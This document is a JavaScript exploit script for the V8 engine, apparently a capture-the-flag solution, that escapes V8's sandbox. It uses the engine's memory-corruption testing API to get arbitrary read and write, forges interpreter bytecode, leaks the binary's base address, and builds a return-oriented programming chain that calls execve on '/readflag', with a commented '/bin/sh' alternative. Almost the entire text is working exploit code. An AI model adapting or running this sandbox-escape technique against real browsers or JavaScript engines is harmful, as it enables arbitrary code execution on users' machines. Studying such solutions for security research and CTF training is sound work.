// is_component_build = false
// is_debug = false
// target_cpu = "x64"
// v8_enable_sandbox = true
//
// v8_enable_backtrace = true
// v8_enable_disassembler = true
// v8_enable_object_print = true
// v8_enable_verify_heap = true
//
// v8_enable_memory_corruption_api = true

BigInt.prototype.hex = function () { return "0x"+this.toString(16); };
Number.prototype.hex = function () { return "0x"+this.toString(16); };

addrof = (obj) => Sandbox.getAddressOf(obj);
var smv = new Sandbox.MemoryView(0, 0xfffffff8);
var dv = new DataView(smv);

aar1 = (of) => { return dv.getUint8(of, true) };
aar4 = (of) => { return dv.getUint32(of, true) };
aar8 = (of) => { return dv.getBigUint64(of, true) };

aaw1 = (of, v) => { return dv.setUint8(of, v, true) };
aaw4 = (of, v) => { return dv.setUint32(of, v, true) };
aaw8 = (of, v) => { return dv.setBigUint64(of, v, true) };

hax = (a, b) => { return a + b + 1 };

var cage_base = aar8(0x58) - 0x68n;
console.log('cage_base: ', cage_base.hex());

var ofs_fake_bytecode = 0x46a40;
var addr_fake_bytecode = cage_base + BigInt(ofs_fake_bytecode);

// compile function first
hax();

/* copy from real bytecode to fake bytecode
0xb600004030c:  0x00000949      0x00400600      0x00000012      0x00194bdd
0xb600004031c:  0x00000000      0x00000011      0x00000019      0x00000000
0xb600004032c:  0x00000003      0x00000000      0x033b040b      0x01014700
0xb600004033c:  0x000000af      0x00000595      0x00000004      0x00194185
0xb600004034c:  0x000253b9      0x00000949      0x00400800      0x0000002e
*/
aaw4(ofs_fake_bytecode+0x00, 0x949);
aaw4(ofs_fake_bytecode+0x04, 0x400600);
aaw4(ofs_fake_bytecode+0x08, 0x12);
aaw4(ofs_fake_bytecode+0x0c, 0x194bdd);
aaw4(ofs_fake_bytecode+0x10, 0);
aaw4(ofs_fake_bytecode+0x14, 0x11);
aaw4(ofs_fake_bytecode+0x18, 0x19);
aaw4(ofs_fake_bytecode+0x1c, 0);
aaw4(ofs_fake_bytecode+0x20, 3);
aaw4(ofs_fake_bytecode+0x24, 0);
aaw4(ofs_fake_bytecode+0x28, 0x033b040b);
aaw4(ofs_fake_bytecode+0x2c, 0x01014700);
aaw4(ofs_fake_bytecode+0x30, 0xaf);

// modify pointer to fake_bytecode
Sandbox.modifyTrustedPointerTable(0x2003 << 9, 0, Number(addr_fake_bytecode+1n));

// edit ldar index from 4 to 19
aaw1(ofs_fake_bytecode+0x29, 19);

// leak lower 32bit address of v8
var leak = Sandbox.H32BinaryAddress + (hax(0, 0) << 1);
var pie = leak - 0x252b31e;
var rax = pie + 0x027d1324;
var rdx = pie + 0x02852f92;
var rsi = pie + 0x027bdf2e;
var rdi = pie + 0x028ea45b;
var syscall = pie + 0x028d7227;
console.log( "pie: 0x" + pie.toString(16) );

// edit bytecode to pivot to heap
aaw1(ofs_fake_bytecode+0x29, 3);
aaw1(ofs_fake_bytecode+0x2a, 0x18); // load pointer to rbp
aaw1(ofs_fake_bytecode+0x2b, 0);
aaw1(ofs_fake_bytecode+0x2c, 0xaf); // ret

// place fake object to chain rop
var fake = 0x121500;
aaw1(fake, 0xaf);

var obj = {};
var addr_obj = addrof(obj);

aaw8(addr_obj-0x28, 0x0n);
aaw8(addr_obj-0x20, (cage_base+BigInt(fake)) << 8n);
aaw8(addr_obj-0x18, 0x0n);
aaw8(addr_obj-0x10, 0x0n);

// place rop
aaw8(addr_obj+0x08+1, BigInt(rax) );
// 
aaw8(addr_obj+0x18+1, BigInt(rax) );
aaw8(addr_obj+0x20+1, BigInt(0x3b) );
aaw8(addr_obj+0x28+1, BigInt(rdx) );
aaw8(addr_obj+0x30+1, BigInt(0) );
aaw8(addr_obj+0x38+1, BigInt(rsi) );
aaw8(addr_obj+0x40+1, BigInt(0) );
aaw8(addr_obj+0x48+1, BigInt(rdi) );
aaw8(addr_obj+0x50+1, cage_base + BigInt(addr_obj+0x70) );
aaw8(addr_obj+0x58+1, BigInt(syscall) );

// /bin/sh
//aaw8(addr_obj+0x70, 0x68732f6e69622fn );

// /readflag
aaw8(addr_obj+0x70, 0x616c66646165722fn );
aaw8(addr_obj+0x78, 0x67n );

// trigger 
hax(obj);
